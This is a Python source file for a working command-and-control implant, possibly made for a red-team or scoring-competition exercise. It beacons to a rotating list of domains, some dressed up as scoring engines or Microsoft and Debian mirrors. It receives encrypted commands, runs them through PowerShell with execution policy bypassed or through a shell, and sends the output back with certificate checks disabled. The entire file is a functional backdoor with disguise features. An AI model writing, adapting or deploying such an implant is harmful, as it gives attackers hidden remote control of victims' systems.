import requests
import subprocess
import time
import platform
import json
from cryptography.fernet import Fernet

# Encryption setup
SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)

DEBUG_MODE = False

# Failover list
C2_DOMAINS = ["https://midevil-scoring-engine.com",
              "https://midevil-dashboard.local",
              "https://midevil.domain.local",
              "https://scoring-midevil.com",
              "https://scorify.com",
              "https://score-agent.local",
              "https://score-engine.local",
              "https://debian-mirror-useast.com",
              "https://microsoft-azure-useast.com",
              "https://score-check-agent.local"]

# Path to self-signed cert
if platform.system() == "Windows":
    CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\snakeeyes-ca.crt"
else:
    CERT_PATH = r"/usr/local/share/ca-certificates/snakeeyes-ca.crt"


def get_system_info():
    """Gathers system metadata for the dashboard asset inventory."""
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "status": "Online"
    }
    return json.dumps(info)

def run_agent():
    my_hostname = platform.node()
    current_os = platform.system()
    if DEBUG_MODE is True:
        print(f"[*] Agent [{my_hostname}] initialized on {current_os}. Beginning beaconing...")

    while True:
        for url in C2_DOMAINS:
            try:
                # Prepare Heartbeat
                raw_info = get_system_info()
                encrypted_heartbeat = cipher.encrypt(raw_info.encode())

                # Check-in
                response = requests.post(
                    f"{url}/checkin",
                    data=encrypted_heartbeat,
                    timeout=10,
                    verify=False
                )

                if response.status_code == 200:
                    encrypted_command = response.content
                    command = cipher.decrypt(encrypted_command).decode()

                    if command and command.lower() != "none":
                        if DEBUG_MODE is True:
                            print(f"[*] Executing: {command[:120]}")

                        # Normal command execution
                        if current_os == "Windows":
                            full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
                            raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
                        else:
                            raw_result = subprocess.getoutput(command)

                        # Format Result
                        formatted_result = f"{my_hostname}|{raw_result}"
                        encrypted_result = cipher.encrypt(formatted_result.encode())

                        # Send result back
                        requests.post(
                            f"{url}/result",
                            data=encrypted_result,
                            verify=False,
                            timeout=10
                        )
                        if DEBUG_MODE is True:
                            print("[+] Result transmitted.")

                    break

            except Exception as e:
                # Fallback for empty results/errors
                error_msg = f"{my_hostname}|Error executing command: {str(e)}"
                try:
                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=False, timeout=5)
                except Exception:
                    pass
                if DEBUG_MODE is True:
                    print(f"[!] Connection failed for {url}: {e}")
                continue

        wait_time = 60
        if DEBUG_MODE is True:
            print(f"[*] Beacon interval complete. Sleeping {wait_time}s...")
        time.sleep(wait_time)


if __name__ == "__main__":
    run_agent()